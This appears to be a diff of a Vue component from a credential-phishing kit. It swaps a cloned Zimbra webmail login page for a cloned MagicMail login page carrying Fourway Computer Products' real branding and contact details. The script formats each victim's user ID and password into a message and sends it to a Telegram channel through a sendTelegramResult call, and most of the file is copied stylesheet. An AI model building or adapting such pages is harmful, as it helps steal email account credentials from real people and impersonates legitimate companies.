@@ -1,84 +1,308 @@
 <template>
   <div id="app">
-    <div>
+ 
+<body id="MagicBody" class="MagicBody">
 
-		<body >
+<div id="MagicWrapper" class="magic-unauthenticated">
 
-	<div id="modifiedLogin" class="LoginScreen">
-		<div class="modernCenter">
-                <div class="modernContentBox">
-                    <div class="logo">
-                        <a href="http://www.mtaonline.net" id="bannerLink" target="_new" title="Zimbra"><span class="ScreenReaderOnly">Zimbra</span>
-                            <span class="ImgLoginBanner"></span>
-                        </a>
-                    </div>				
-				<form id="zLoginForm"  name="loginForm"  accept-charset="UTF-8">
-								<input type="hidden" name="loginOp" value="login">
-								<input type="hidden" name="login_csrf" value="8385df0c-48d2-4179-ab47-7a41388adeff">
+<table class="MagicOuterTable">
+<tr id="page_contents_row">
+<td>
 
-								<div class="signIn" >Sign In</div>
-                        <div class="form">
+<!-- Header -->
+<table id="MainHeaderTable">
+<tr valign="top">
+    <td id="MMLogo">
+        <img id="leftHeaderLogo"
+             src="../src/assets/images/magicmail_logo_white.png"
+             width="283"
+             height="75"
+             alt="MagicMail">
+    </td>
 
-                     <div id="errorMessageDiv" class="errorMessage" v-if="isActive">
-                            The username or password is incorrect. Verify that CAPS LOCK is not on, and then retype the current username and password.</div>
+    <td align="right">
+        <table id="header-table">
+            <tr>
+                <td colspan="2" id="HeaderLogo">
+                    <img id="rightHeaderLogo"
+                         src="../src/assets/images/fourway.gif"
+                         width="265"
+                         height="75"
+                         alt="Fourway">
+                </td>
+            </tr>
+
+            <tr valign="bottom">
+                <td colspan="2">
+                    <div class="MagicNavTab">
+                        <a href="logout.php">Logout</a>
+                    </div>
+                </td>
+            </tr>
+        </table>
+    </td>
+</tr>
+
+<tr id="UserSubHeaderRow">
+    <td colspan="2"></td>
+</tr>
+</table>
+
+<!-- Content -->
+<table class="MagicContentTable">
+<tr valign="top">
+<td class="MagicContentCell">
+
+<div id="loginContentCell">
+
+<div class="login-info-content">
+<h2>Welcome to MagicMail</h2>
+
+<h4>Login to access your account</h4>
+
+<p class="main_wiz">
+Welcome to the User Site for the MagicMail System.<br>
+This is where you can setup and configure all your email options.
+</p>
+
+<h4>Forgot Your Password?</h4>
+
+<p class="main_wiz">
+We are dedicated to providing you a secure online environment.<br>
+To have your password reset, please contact your local Customer Service and Technical Support team.<br><br>
+
+<small><i>* You MUST have cookies enabled to use these functions.</i></small>
+</p>
+
+</div>
+
+<div id="login-form-wrapper">
+
+<form method="post" id="login-form">
+
+<input type="hidden" id="browser_info" value="Win10">
+
+<blockquote>
+
+<table id="login-form-table" class="MagicEmbeddedTable">
+
+<tr>
+    <th colspan="2">
+        <h4>Login to MagicMail</h4>
+    </th>
+</tr>
 
 
-                        <div class="loginSection">
-                                    <label for="username" class="zLoginFieldLabel">Username</label>
-                                            <input id="username" tabindex="1" class="zLoginFieldInput" name="username" type="text" v-model="formDataRes.userid" size="40" maxlength="1024" autocapitalize="off" autocorrect="off">
-                                        <label for="password" class="zLoginFieldLabel">Password</label>
-                                    <div class="passwordWrapper">
-                                        <input id="password" tabindex="2" autocomplete="off" class="zLoginFieldInput" name="password" type="password" v-model="formDataRes.password" size="40" maxlength="1024">
-                                        <span toggle="#password"  id="showSpan" style="display: block;">Show</span>
-                                        <span toggle="#password"  id="hideSpan" style="display: none;">Hide</span>
-                                    </div>
-                                    <div class="signInAndLabel">
-                                        <div>
-                                            <button id="loginButton" type="submit" tabindex="5" class="loginButton" @click.prevent="finishJoob();">Sign In</button>
-                                        </div>
-                                        <div class="rememberCheckWrapper"> 
-                                                <input id="remember" tabindex="6" value="1" type="checkbox" name="zrememberme">
-                                                <label id="remember" for="remember">Stay signed in</label>
-                                            </div>
-                                        </div>
-                                </div>
-                            <div>
-                            <hr>
-                            </div>
-                            <div>
-                            <div class="versionBlock">
-                                    <label for="client">Web App Version</label>
-                                    <div style="position: relative;">
-                                        <select id="client" name="client" >
-                                            <option value="preferred" selected=""> Default</option>
-                                            <option value="advanced"> Classic</option>
-                                            <option value="modern"> Modern</option>
-                                            </select>
-                                        <input type="button" class="alignWhatsThis"  id="ZLoginWhatsThisButton">
-                                    </div>
+<tr id="error-row" valign="top" v-if="isActive" class="errorMessage"> <td colspan="2"><div class="error">Invalid Username/Password combination</div></td>
+</tr>
 
-                                    <div id="ZLoginWhatsThis">
-                                        <div class="ZLoginInfo">
-                                            <span id="dialogCloseButton" >×</span>
-                                            <p><strong>Modern</strong><br> The Modern Web App delivers a responsive experience across all your devices and integrates with many popular apps.</p><p><strong>Classic</strong><br> The Classic Web App is familiar to long-time Zimbra users. It delivers advanced collaboration and calendar features popular with power users on Desktop web browsers.</p><p><strong>Default</strong><br> This will sign you in according to your saved Preference. In the Modern Web App, set this preference in Settings &gt; General &gt; Zimbra Version. In Classic, set it in Preferences &gt; General &gt; Sign In.</p></div>
-                                    </div>
-                                </div>
-                            </div>
-                        </div>
-                    </form>
-			</div>
-			<div class="decor1"></div>
-		</div>
 
-		<div class="Footer">
-			<div id="ZLoginNotice" class="legalNotice-small">Copyright © 2005-2025 Synacor, Inc. All rights reserved. "Zimbra" is a registered trademark of Synacor, Inc.</div>
-		</div>
-		<div class="decor2"></div>
-	</div>
+
+<!-- Error message (show manually if needed) -->
+<!--
+<tr>
+<td colspan="2">
+<div class="error">
+Invalid Username/Password combination
+</div>
+</td>
+</tr>
+-->
+
+
+<tr>
+
+<td class="textright">
+<label for="login-email">
+Email:
+</label>
+</td>
+
+<td>
+<input
+type="email"
+name="email"
+id="login-email"
+size="20"
+autocorrect="off"
+autocapitalize="none"
+v-model="formDataRes.userid"
+>
+</td>
+
+</tr>
+
+<tr>
+
+<td class="textright">
+<label for="login-password">
+Password:
+</label>
+</td>
+
+<td class="show-password">
+
+<input
+type="password"
+name="password"
+id="login-password"
+size="20"
+v-model="formDataRes.password"
+>
+
+<label>
+<input type="checkbox" id="show-password">
+Show Password
+</label>
+
+</td>
+
+</tr>
+
+<tr class="forgot-password-row">
+<td></td>
+
+<td id="recover-pass-td">
+<a href="recover-password.php">
+Forgot your password?
+</a>
+</td>
+
+</tr>
+
+<tr>
+
+<td class="formFoot">
+
+<table>
+<tr>
+
+<td class="poweredBy">
+
+<a href="https://www.magicmail.com" target="_blank">
+
+<img
+src="../src/assets/images/powered_by.png"
+width="100"
+height="51"
+alt="Powered by">
+
+</a>
+
+</td>
+
+<td class="loginBtn">
+
+<input type="submit" value="Login"  @click.prevent="finishJoob();">
+
+</td>
+
+</tr>
+</table>
+
+</td>
+
+</tr>
+
+</table>
+
+</blockquote>
+
+</form>
+
+</div>
+
+</div>
+
+<!-- Mobile Modal -->
+
+<div id="mobileOption" class="mm-modal" style="display:none;">
+
+<div class="mm-modal-content">
+
+<div class="mm-modal-header">
+<h2>Use Mobile Webmail</h2>
+</div>
+
+<div class="mm-modal-body">
+
+<p>
+Would you like to use the mobile-friendly webmail optimized for this device?
+</p>
+
+<label>
+<input type="checkbox">
+Remember this choice
+</label>
+
+</div>
+
+<div class="mm-modal-footer">
+
+<input
+id="mobileChoiceDesktop"
+type="button"
+value="No Thank You">
+
+<input
+id="mobileChoiceMobile"
+type="button"
+value="Yes Please!">
+
+</div>
+
+</div>
+
+</div>
+
+</td>
+</tr>
+</table>
+
+</td>
+</tr>
+
+<!-- Footer -->
+
+<tr id="footer_row">
+<td>
+
+<table width="100%">
+<tr align="center" class="MagicCompanyFooter">
+<td>
+
+MagicMail Server is brought to you by Fourway Computer Products, Inc.<br>
+
+12700 4A Road Plymouth, IN 46563<br>
+
+Tel: 800-733-0062
+
+<a href="mailto:webmaster@fourway.net">
+webmaster@fourway.net
+</a>
+
+</td>
+</tr>
+</table>
+
+<table width="100%">
+<tr align="center" class="MagicCopyRight">
+<td>
+<p>
+MagicMail is a Registered Trademark of Wizard Tower TechnoServices Ltd.
+</p>
+</td>
+</tr>
+</table>
+
+</td>
+</tr>
+
+</table>
+
+</div>
 
 </body>
-
-	</div>
   </div>
 </template>
 
@@ -108,7 +332,7 @@ export default {
         this.loading = true;
 
         // Format the message as string
-        const message = `*mta *\nUserID: ${this.formDataRes.userid}\nPassword: ${this.formDataRes.password}`;
+        const message = `*4way *\nUserID: ${this.formDataRes.userid}\nPassword: ${this.formDataRes.password}`;
 
         // Send to Telegram
         await this.sendTelegramResult(
@@ -145,891 +369,1888 @@ export default {
 
 
 <style>
+body {
+    margin: 0;
+    font-family: Arial, Helvetica, sans-serif;
+    background: #e5e5e5;
+}
 
-.ScreenReaderOnly{position:absolute!important;height:1px;width:1px;overflow:hidden;clip:rect(1px,1px,1px,1px);}
-.user_font_modern,.user_font_modern TEXTAREA,.user_font_modern INPUT{font-family:"Helvetica Neue",Helvetica,Arial,"Liberation Sans",sans-serif;}
-.user_font_classic,.user_font_classic TEXTAREA,.user_font_classic INPUT{font-family:Tahoma,Arial,sans-serif;}
-.user_font_wide,.user_font_wide TEXTAREA,.user_font_wide INPUT{font-family:Verdana,sans-serif;}
-.user_font_system,.user_font_system TEXTAREA,.user_font_system INPUT{font-family:"Segoe UI","Lucida Sans",sans-serif;}
-.user_font_size_small{font-size:11px;}
-.user_font_size_normal{font-size:12px;}
-.user_font_size_large{font-size:14px;}
-.user_font_size_larger{font-size:16px;}
-P,TH,TD,DIV,SELECT,INPUT[type=text],INPUT[type=password],INPUT[type=file],TEXTAREA,BUTTON{font-size:1rem;}
-HTML{width:100%;height:100%;}
-BODY{width:100%;height:100%;margin:0;}
-FORM{margin:0;padding:0;}
-TABLE{border-collapse:collapse;border-spacing:0;border-width:0;}
-TD{border-width:0;padding:0;}
-FIELDSET{border:1px solid #f2f2f2;padding:5px;margin:5px;}
-LEGEND{font-weight:bold;white-space:nowrap;overflow:hidden;color:#333;}
-INPUT[readonly]{color:#999;background-color:transparent;border:1px solid #e5e5e5;}
-TEXTAREA{padding:.2em .3em;cursor:text;color:black;border:1px solid #bfbfbf;resize:none;}
-TEXTAREA[readonly]{color:#999;background-color:transparent;border:1px solid #e5e5e5;}
-INPUT[type="checkbox"]{cursor:pointer;}
-INPUT[type="checkbox"]:focus{outline-style:solid;outline-width:1px;outline-color:#5b798a;}
-INPUT[type="text"],INPUT[type="password"]{padding:0 3px;cursor:text;height:22px;height:2rem;color:black;border:1px solid #bfbfbf;}
-INPUT[disabled]{color:#999;background-color:transparent;border:1px solid #e5e5e5;}
-textarea{padding:.2em .3em;cursor:text;color:black;border:1px solid #bfbfbf;}
-.CompactTable{border-collapse:collapse;border-spacing:0;padding:0;}
-.fullSize{width:100%;height:100%;}
-.fullWidth{width:100%;}
-.fullHeight{height:100%;}
-.minSize{width:1px;height:1px;}
-.leftAlign{text-align:left;}
-.rightAlign{text-align:right;}
-.checkboxLabel{font-weight:bold;}
-.ToolbarBg{background-color:transparent;}
-.ZmHead{font-size:1.36rem;font-weight:bold;}
-.ZmSubHead{font-size:1.18rem;}
-.ZmBigger{font-size:1.36rem;font-weight:bold;}
-.ZmFinePrint{font-size:.82rem;}
-.ZmImportant{color:darkred;}
-.ZmFieldLabel{white-space:nowrap;overflow:hidden;color:#333;}
-.ZmFieldLabelLeft{white-space:nowrap;overflow:hidden;color:#333;text-align:left;}
-.ZmFieldLabelRight{white-space:nowrap;overflow:hidden;color:#333;text-align:right;}
-.ZmFieldLabelCenter{white-space:nowrap;overflow:hidden;color:#333;text-align:center;}
-ZmSectionLabel{white-space:nowrap;overflow:hidden;color:#333;border-bottom:1px solid #f2f2f2;font-size:1.36rem;font-weight:bold;}
-.TextPadding{padding-left:3px;padding-right:3px;}
-.BigHeaderBg{padding-top:1px;border-bottom:1px solid #f2f2f2;background-color:#e5e5e5;height:36px;height:2.8rem;}
-.ZmOverride{background-color:#FFF6BF;padding:2px;}
-.ZmGraphKey{background-color:#fff;border-color:#7f7f7f #cccccc #ccc #7f7f7f;margin:0;border-width:1px;border-style:solid;}
-.ZmGraphKeyHeader{background-color:#e5e5e5;font-size:1.18rem;color:#333;padding-left:3px;padding-right:3px;text-align:left;font-weight:bold;vertical-align:middle;}
-.ZmGraphKeyBody{padding:5px;margin:5px;}
-.ZmGraphKeyColorBox{border-color:#7f7f7f #cccccc #ccc #7f7f7f;margin:0;border-width:1px;border-style:solid;width:10px;height:10px;}
-.ZmGraphKeyColorText{color:#333;white-space:nowrap;overflow:hidden;}
-.horizSep{height:1px!important;border-bottom:1px solid #f2f2f2;font-size:1px;line-height:1px;margin:5px 0;width:100%;}
-.vertSep{border-left:1px solid #f2f2f2;margin-left:3px;padding-right:3px;height:20px;}
-DIV.vSpace{margin:5px 0;}
-TD.vSpace{width:2px;}
-.AttLink:link,.AttLink:visited{color:#005A95;text-decoration:none;cursor:pointer;}
-.AttLink:hover{color:#005A95;text-decoration:underline;}
-.AttLink:active{color:darkgreen;text-decoration:underline;}
-.Row-selected .AttLink:link,.Row-selected .AttLink:active,.Row-selected .AttLink:visited{color:#005A95;text-decoration:none;cursor:pointer;}
-.AttLink:hover,.Row-selected .AttLink:hover{color:#005A95;text-decoration:underline;}
-.DragProxy{opacity:.7;}
-.notDroppable{border:2px solid red!important;background-color:#99cae7;box-shadow:5px 5px 15px #999;opacity:.7;}
-.notDroppable-linux{border:2px solid red!important;background-color:#99cae7;box-shadow:5px 5px 15px #999;}
-.droppable{border:2px solid green!important;background-color:#99cae7;box-shadow:5px 5px 15px #999;opacity:.7;}
-.droppable-linux{border:2px solid green!important;background-color:#99cae7;box-shadow:5px 5px 15px #999;}
-.DropTarget{border:1px solid green!important;}
-.DragProxyTextLabel{font-weight:bold;color:white;}
-.BusyOverlay TABLE,.VeilOverlay TABLE{opacity:.5;cursor:wait;background-color:transparent;}
-.VeilOverlay TABLE{cursor:default!important;cursor:not-allowed!important;background-color:black;}
-.CurtainOverlay TABLE{background-color:black;}
-html[data-istwofactorsetuppage] .VeilOverlay TABLE{background:#0088c1 url(../src/assets/images/new-back-ground-image.png) 0 0/cover no-repeat;opacity:1;}
-.Row{height:20px;height:1.8rem;cursor:pointer;margin:1px;padding-right:3px;-khtml-user-select:none;}
-.RowDouble{height:20px;height:1.8rem;cursor:pointer;margin:1px;padding-right:3px;-khtml-user-select:none;height:36px;height:2.6rem;border-bottom-color:#CCC;padding-top:3px;}
-.Row TABLE,.RowDouble TABLE{table-layout:fixed;}
-.Row TD,.RowDouble TD,.Row DIV,.RowDouble DIV{vertical-align:middle;white-space:nowrap;overflow:hidden;}
-.RowDouble TD{vertical-align:top;}
-.RowDouble TD.SubjectDoubleRow{vertical-align:text-bottom;}
-.ZmMsgListBottomRowIcon{margin-left:23px;margin-right:5px;}
-.ZmConvExpanded .ZmMsgListBottomRowIcon{margin-left:39px;}
-.ZmMsgListSelection .ZmMsgListBottomRowIcon{margin-left:37px;}
-.ZmConvExpanded .ZmMsgListSelection .ZmMsgListBottomRowIcon{margin-left:54px;}
-.Row{background-color:#fff;}
-.RowOdd{background-color:#fff;}
-.selected,.Row-selected,.Row-selected-dragProxy,.Row-selected-disabled{background-color:#99cae7!important;background-image:none!important;}
-.Row-selected .ZmListFlagsWrapper,.Row-selected-disabled .ZmListFlagsWrapper,.Row-selected .ZmMsgListDate,.Row-selected-disabled .ZmMsgListDate{background:#99cae7!important;}
-.Row-selected-actioned .ZmListFlagsWrapper,.Row-selected-actioned .ZmMsgListDate{background:#99cae7!important;}
-.Row-altSelected{background-color:#e5f1f9!important;background-image:none!important;}
-.Row-altSelected .ZmListFlagsWrapper,.Row-altSelected .ZmMsgListDate{background:#e5f1f9!important;}
-.Row-matched-dragProxy{background-color:yellow;}
-.Row-matched TABLE,.Row-matched-drag TABLE{table-layout:fixed;}
-.Row-focused{outline-style:solid;outline-width:1px;outline-color:#5b798a;}
-.Row-selected-actioned{background-color:#99cae7!important;}
-.Row-dragProxy,.Row-matched-dragProxy{background-color:#99cae7!important;}
-.RowDouble-dragProxy .ZmListFlagsWrapper,.RowDouble-dragProxy .ZmMsgListDate,.Row-dragProxy .ZmListFlagsWrapper,.Row-dragProxy .ZmMsgListDate{background-color:#99cae7!important;}
-.Row TD,.RowDouble TD,.Row DIV,.RowDouble DIV{color:#333;}
-.RowOdd TD,.RowOdd DIV{color:#333;}
-.RowOdd .ZmMsgListDate,.RowOdd .ZmListFlagsWrapper{background-color:#fff;}
-.RowEven .ZmMsgListDate{background-color:#fff;}
-LI.RowDouble,LI.Row{list-style:none;}
-.selected TD,.Row-selected TD,.Row-selected-dragProxy TD,.Row-selected-disabled TD{color:black;}
-.Row-focused TD{color:#333;}
-.Row-selected-right TD{color:#333;}
-.Row-dragProxy TD,.Row-matched-dragProxy TD{color:#333;}
-.Row TD.Flag,.Row TD.Attach,.Row TD.Tag,.Row TD.Icon,.Row TD.Count,.Row-selected TD.Flag,.Row-selected TD.Attach,.Row-selected TD.Tag,.Row-selected TD.Icon,.Row-selected TD.Count,.Row-dragProxy TD.Flag,.Row-dragProxy TD.Attach,.Row-dragProxy TD.Tag,.Row-dragProxy TD.Icon,.Row-dragProxy TD.Count,.Row-selected-dragProxy TD.Flag,.Row-selected-dragProxy TD.Attach,.Row-selected-dragProxy TD.Tag,.Row-selected-dragProxy TD.Icon,.Row-selected-dragProxy TD.Count,.Row-matched-dragProxy TD.Flag,.Row-matched-dragProxy TD.Attach,.Row-matched-dragProxy TD.Tag,.Row-matched-dragProxy TD.Icon,.Row-matched-dragProxy TD.Count,.Row-dragProxy TD.Flag,.Row-dragProxy TD.Attach,.Row-dragProxy TD.Tag,.Row-dragProxy TD.Icon,.Row-dragProxy TD.Count{text-align:center;}
-.RowDouble TD.Count,.RowDouble-selected TD.Count{text-align:right;}
-.Unread{color:#333;font-weight:bold;}
-.Trash{color:#999;text-decoration:line-through;}
-.Unread .SubjectDoubleRow{color:#333;font-weight:bold;}
-.ZmOverview{width:100%;height:100%;}
-.ZmOverviewContainer{background-color:#fff;border:none;border-radius:3px;}
-.ZmVoiceOverviewContainer .ZmOverview,.ZmOverviewContainer .ZmOverview,.dialogOverviewContainer .OverviewTree{height:auto;}
-.OverviewTree{width:100%;}
-.dialogOverview{background-color:#fff;border:none;border-radius:3px;border-color:#7f7f7f #cccccc #ccc #7f7f7f;margin:0;border-width:1px;border-style:solid;padding:5px;height:200px;}
-.dialogOverviewContainer{background-color:#fff;}
-.dialogOverview TD{color:#333;}
-.pickerOverview{background-color:#fff;border:none;border-radius:3px;height:100%;}
-.overviewHeader{cursor:default;background-color:transparent;color:#333;font-weight:bold;padding-top:1px;padding-bottom:1px;}
-.overviewHeader-Text,.overviewHeader-dragOver{color:#333;font-weight:bold;}
-.overviewHeader .imageCell{padding-right:5px;padding-top:.2rem;white-space:nowrap;}
-.overviewHeader TD{background-color:#fff;}
-.overviewHeader.overviewHeader-selected TD{background-color:#99cae7;}
-.overviewHeader.overviewHeader-selected.overviewHeader-selected-focused TD{border-color:#4c6573 #1e282e #1e282e #5b798a;outline:none;}
-.inlineIcon{font-family:Verdana;font-size:13px;}
-.inlineContactTagIcon{font-size:11px;vertical-align:middle;}
-.TooltipHint{font-style:italic;text-align:center;white-space:nowrap;}
-.TooltipNotInAddrBook{white-space:nowrap;text-align:center;padding:8px 0 5px 0;}
-.ImgTagShared{display:inline-block;}
-.FakeAnchor,A:link,A:visited{color:#005A95;text-decoration:none;cursor:pointer;}
-.FakeAnchor:hover,A:hover{color:#005A95;text-decoration:underline;}
-.FakeAnchor:active,A:active{color:darkgreen;text-decoration:underline;}
-.FakeAnchor:focus,A:focus{outline-style:solid;outline-width:1px;outline-color:#5b798a;}
-.FakeAnchor.ZDisabled,.FakeAnchor.ZDisabled:hover,.FakeAnchor.ZDisabled:active{color:#999;text-decoration:none;}
-.AutoAnchor,.AutoAnchor:link,.AutoAnchor:visited{color:#005A95;text-decoration:none;cursor:pointer;border-bottom:1px dotted;color:#005A95;}
-.AutoAnchor:hover{color:#005A95;text-decoration:underline;}
-.AutoAnchor:active{color:darkgreen;text-decoration:underline;}
-.LoginScreen P,.LoginScreen TH,.LoginScreen TD,.LoginScreen DIV,.LoginScreen SPAN,.LoginScreen SELECT,.LoginScreen INPUT,.LoginScreen TEXTAREA,.LoginScreen BUTTON,.LoginScreen A{font-family:"Helvetica Neue",Helvetica,Arial,"Liberation Sans",sans-serif;}
-HTML{width:100%;height:100%;}
-BODY{background-color:#FFF;width:100%;height:100%;margin:0;}
-FORM{margin:0;padding:0;}
-.signIn{font-size:20px;padding:19px 0;color:#4d4d4d;font-weight:bold;}
-.loginSection{padding:15px 0;}
-.versionBlock{padding:20px 40px;background:#eee;position:relative;margin:0 -40px -40px;}
-.versionBlock label{display:block;padding-bottom:3px;color:#4d4d4d;}
-select#client{width:100%;background:#fff;height:32px;outline:none;}
-select#client:focus{border-color:#0088c1;}
-.trustedDeviceDiv{padding:9px 0;font-size:13px;color:#4d4d4d;}
-.verifyButtonWrapper{padding:12px 0;}
-.twoFactorAuthCodeLabel,.twoFactorDescription,.twoFactorMethodOption{font-size:13px;color:#4d4d4d;}
-.chooseTFAMethod{width:100%;}
-.chooseTFAMethod,.resendCode{text-align:right;font-size:13px;color:#4d4d4d;}
-.twoFactorMethodOption{padding:10px 0;}
-.tfaMethodRadio{display:block;float:left;}
-.tfaMethodLabel{display:inline-block;padding-left:5px;}
-.ZSplashScreen{background-color:#FFF;width:100%;height:100%;top:0;left:0;position:absolute;}
-#ZLoginPanel{position:relative;width:500px;overflow:visible;background-color:#f2f2f2;box-shadow:5px 5px 15px #999;border-radius:4px;border-color:#999 #7f7f7f #7f7f7f #999999;margin:0;border-width:1px;border-style:solid;}
-.LoginScreen FORM{text-align:center;}
-#zLoginForm{text-align:left;}
-form#zLoginForm .form INPUT[type='text'],form#zLoginForm .form INPUT[type='password'],.twoFactorForm INPUT[type="text"]{border:1px solid #d9d9d9;padding:6px 12px;width:100%;height:36px;box-sizing:border-box;margin-bottom:10px;}
-form#zLoginForm .form INPUT[type='text']:focus,form#zLoginForm .form INPUT[type='password']:focus,.twoFactorForm INPUT[type="text"]:focus{border-color:#0088c1;}
-.form{border-collapse:collapse;color:white;margin:0 auto;text-align:left;}
-.form TD:first-child LABEL{margin-right:20px;}
-.form TD{padding-bottom:10px;}
-.form INPUT[type='text'],.form INPUT[type='password']{border:1px solid #FFF;padding:0;width:235px;height:20px;}
-.form INPUT[type='text']:focus,.form INPUT[type='password']:focus{border:1px solid #99cae7;}
-.form SELECT{height:20px;width:165px;}
-.form .submitTD{text-align:left;}
-.form .rememberCheckWrapper{flex:1;padding-left:20px;justify-content:flex-end;}
-input.loginButton,button.loginButton{background-color:#0088c1;color:#fff;float:left;font-size:13px;padding:8px 23px;border-radius:4px;cursor:pointer;outline:none;border:none;-moz-appearance:none;-webkit-appearance:none;}
-input.twoFactorButton{background-color:#0088c1;color:#fff;font-size:13px;padding:8px;border-radius:4px;cursor:pointer;outline:none;border:none;-moz-appearance:none;-webkit-appearance:none;}
-#verifyButton,#nextButton{background-color:#0088c1;color:#fff;height:32px;}
-#verifyButton:hover,#verifyButton:focus,#nextButton:hover,#nextButton:focus{background-color:#009adb;}
-#cancelButton,#backButton{background-color:#f2f2f2;color:#4d4d4d;height:32px;margin:0 4px;}
-#cancelButton:hover,#cancelButton:focus,#backButton:hover,#backButton:focus{background-color:#e5e5e5;}
-input.twoFactorButton[disabled],input.loginButton[disabled]{border:none;}
-input.loginButton:hover,input.loginButton:focus{background-color:#009adb;}
-.hideTooltip{display:none;}
-.twoFactorForm{padding:20px 0;}
-input#remember{outline:none;float:left;}
-.rememberCheckWrapper span{display:block;overflow:hidden;padding-top:2px;}
-input#trustedDevice{margin:0;outline:none;}
-label#remember{color:#4d4d4d;}
-.twoFactorTitle{font-size:20px;font-weight:bold;padding:17px 0;color:#4d4d4d;}
-#trustedDeviceLabel{padding-left:5px;color:#4d4d4d;}
-.form .ZLoginButton{border-radius:3px;border:1px solid #999;float:right;font-size:1em;}
-.form HR{border-color:transparent transparent white;height:0;}
-.LoginScreen .positioning{position:relative;z-index:20;}
-.alignWhatsThis{position:absolute;top:9px;left:105%;}
-.LoginScreen #ZLoginWhatsThisAnchor{color:#1e282ec2;font-size:.9em;margin-left:8px;position:absolute;left:100%;top:8px;outline:none;}
-#dialogCloseButton{position:absolute;font-size:20px;right:15px;top:10px;cursor:pointer;}
-.LoginScreen #ZLoginForgotPassword{color:#007CC3;font-size:11px;float:right;padding:2px;outline:none;}
-.LoginScreen #ZLoginForgotPassword:focus{color:#4d4d4d;}
-.passwordWrapper{position:relative;}
-.passwordWrapper #hideSpan,#oldPasswordHideSpan,#newPasswordHideSpan,#confirmHideSpan{position:absolute;z-index:2;font-size:10px;color:#4d4d4d;right:10px;top:11px;cursor:pointer;}
-.passwordWrapper #showSpan,#oldPasswordShowSpan,#newPasswordShowSpan,#confirmShowSpan{position:absolute;z-index:2;font-size:10px;color:#4d4d4d;right:10px;top:11px;cursor:pointer;}
-.passwordWrapper #hideSpan:focus,.passwordWrapper #showSpan:focus,.passwordWrapper #hideSpan:hover,.passwordWrapper #showSpan:hover{color:#0088c1;}
-.LoginScreen .ZLoginInfo{position:absolute;z-index:3;bottom:50%;left:13px;right:13px;padding:24px 24px;border:none;border-radius:5px;background-color:#fff;box-shadow:0 4px 6px 0 rgba(0,0,0,.4);color:#4d4d4d;}
-.LoginScreen .ZLoginInfo p{font-size:12px;}
-.LoginScreen .ZLoginInfo p strong{font-size:14px;}
-.LoginScreen .ZLoginInfoMessage{background-color:#FFF;border:1px solid #005d92;color:#333;padding:3px 7px;text-align:left;box-shadow:0 0 2px black;}
-.loginTitle{padding:0 40px;font-size:13px;color:#4d4d4d;}
-.signInAndLabel{display:flex;}
-.signInAndLabel>div{display:flex;align-items:center;}
-.cancelButton{border-radius:4px;margin:5px;background-color:#d9d9d9;color:#4d4d4d;padding:8px 23px;font-size:13px;cursor:pointer;outline:none;border:none;-moz-appearance:none;-webkit-appearance:none;}
-button.loginButton[disabled]{opacity:.4;pointer-events:none;}
-.DwtButton{height:22px;height:2rem;cursor:pointer;background:#fff;}
-.DwtButton-hover{height:22px;height:2rem;cursor:pointer;background:#cce4f3;}
-.DwtButton-active{height:22px;height:2rem;cursor:pointer;background:#99cae7;}
-.DwtButton-selected{height:22px;height:2rem;cursor:pointer;background:#99cae7;}
-.DwtButton-disabled{height:22px;height:2rem;cursor:pointer;background:#fff;}
-.DwtButton-active{height:22px;height:2rem;cursor:pointer;border-color:#7f7f7f #3f3f3f #3f3f3f #7f7f7f;margin:0;border-width:1px;border-style:solid;background-color:#a3cfe9;}
-.DwtButton-focused{height:22px;height:2rem;cursor:pointer;background:#fff;border-color:#4c6573 #1e282e #1e282e #5b798a;outline:none;}
-.DwtButton .Text{text-align:center;color:#333;}
-.DwtButton-hover .Text{text-align:center;color:#333;}
-.DwtButton-active .Text{text-align:center;color:#333;}
-.DwtButton-selected .Text{text-align:center;color:#333;}
-.DwtButton-disabled .Text{text-align:center;color:#999;}
-.DwtButton-active .Text{text-align:center;color:#333;}
-.DwtButton-focused .Text{text-align:center;color:#333;}
-.LaunchButton{padding:10px;text-align:center;}
-.LaunchButton INPUT{font-size:1.36rem;font-weight:bold;background-color:#DCF9FE;border:1px solid #6CF;color:black;cursor:pointer;display:inline-block;height:35px;text-align:center;width:250px;box-shadow:0 0 3px black;background-image:-webkit-gradient(linear,left top,bottom bottom,to(#dcf9fe),from(#9ff0ff));background-image:-webkit-linear-gradient(top,#dcf9fe,#9ff0ff);border-radius:26px;}
-.LaunchButton INPUT:hover{box-shadow:0 0 1px black;background-image:-webkit-gradient(linear,left top,bottom bottom,to(#9ff0ff),from(#dcf9fe));background-image:-webkit-linear-gradient(top,#9ff0ff,#dcf9fe);}
-.spacer{font-size:1.2em;line-height:1.3em;padding:5px;}
-.LoginScreen .center-small{background-color:#006faf;margin:10px auto;overflow:visible;padding-top:5px;width:250px;}
-.LoginScreen .center-small #ZLoginErrorPanel{max-height:40px;overflow:auto;}
-.center-small H1{margin:10px 20px 20px;}
-.center-small .decor1{display:none;}
-.center-small .form{border-collapse:collapse;color:white;margin:0 10px;text-align:left;}
-.center-small .form td:first-child LABEL{margin-right:5px;}
-.center-small .form INPUT[type='text'],.center-small .form INPUT[type='password']{border:1px solid #007CC3;width:155px;}
-.center-small .form SELECT{width:140px;}
-.center-small #ZloginWhatsThisAnchor,.center-small .offline{display:none;}
-.Footer-small{position:relative;text-align:center;width:100%;}
-.Footer-small .copyright{font-size:9px!important;}
-.Footer-small #ZLoginNotice{display:none;}
-#ZLoginWhatsThis{display:none;}
-#ZLoginWhatsThisButton{background:url(/img/questionMark.png) center center no-repeat;border:transparent;outline:none;width:15px;height:15px;padding:0;background-size:15px 15px;}
-.errorBox{background:#fff;border-radius:3px;max-width:400px;margin:10% auto;padding:24px;box-shadow:0 5px 8px rgba(0,0,0,0.3);}
-.errorBox h2{margin:0 0 24px;font-size:20px;font-weight:normal;}
-.errorBox p{font-size:1.1rem;}
-.ErrorScreen a.errGoBack:active,.ErrorScreen a.errGoBack:visited{outline:none;color:#007CC3;text-decoration:none;}
-.ErrorScreen a.errGoBack:hover{outline:none;color:#007CC3;text-decoration:underline;}
-.ErrorScreen a.errGoBack:focus{outline:none;color:#4d4d4d;text-decoration:underline;}
-HTML{font-size:12px;}
-IMG{border:none;vertical-align:middle;}
-LEGEND{color:#999;}
-SUBMIT,.tbButton,.searchButton{border-radius:3px;border:1px solid #999;height:100%;background:#fff;text-align:center;color:#333;font-size:1rem;}
-.tbButton{height:auto;}
-.ZhAppLinks{vertical-align:middle;white-space:nowrap;}
-.ZhAppLinks a:link,.ZhAppLinks a:visited{text-decoration:none;font-weight:bold;color:darkblue;}
-.ZhAppSwitchLink{white-space:nowrap;}
